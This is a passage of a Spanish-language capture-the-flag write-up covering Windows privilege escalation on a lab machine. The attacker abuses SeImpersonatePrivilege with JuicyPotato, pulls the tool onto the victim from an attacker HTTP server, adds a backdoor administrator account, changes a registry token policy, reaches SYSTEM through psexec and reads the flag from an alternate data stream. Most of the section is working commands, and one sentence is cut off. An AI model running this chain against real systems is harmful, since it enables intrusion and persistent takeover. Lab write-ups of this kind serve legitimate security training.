## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
systeminfo
whoami /priv
```

Aqui vemos que tenemos el `SeImpersonatePrivilege` ;)

Tiramos como siempre de JuicyPotatoe.exe

Lo descargamos en la maquina de atacante y lo enviamos a la victima.

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
cp /usr/share/sqlninja/apps/nc.exe
python3 -m http.server 80
```

En la maquina victima lo descargamos

```bash
cd C:\Windows\Temp
mkdir privesc
cd privesc
iwr -uri http://10.10.14.7/JuicyPotato.exe -OutFile JuicyPotato.exe
```

Nos creamos un nuevo usuario con el JuicyPotato.

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user s4vitar s4vitar1234$! /add"
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators s4vitar /add"
```

Si comprobamos con el commando `crackmapexec smb 10.10.10.63 -u 's4vitar' -p 's4vitar1234$!'` Vemos que el usuario no esta pwned.
Aqui tenemos que 

```bash
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"
./JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

Si comprobamos otra vez con crackmapexec, vemos ahora que el usuario s4vitar esta pwned.
Ya nos podemos connectar con psexec

```bash
impacket-psexec WORKGROUP/s4vitar@10.10.10.63 cmd.exe
Password: s4vitar1234$!

whoami

#Output
nt authority\system

cd C:\Users\Adminstrator\Desktop
dir
type hm.txt
```

Aqui nos dice que la flag no esta aqui. Pensamos a Alternative Data Streams.

```bash
dir /r
more < hm.txt:root.txt
```

;)
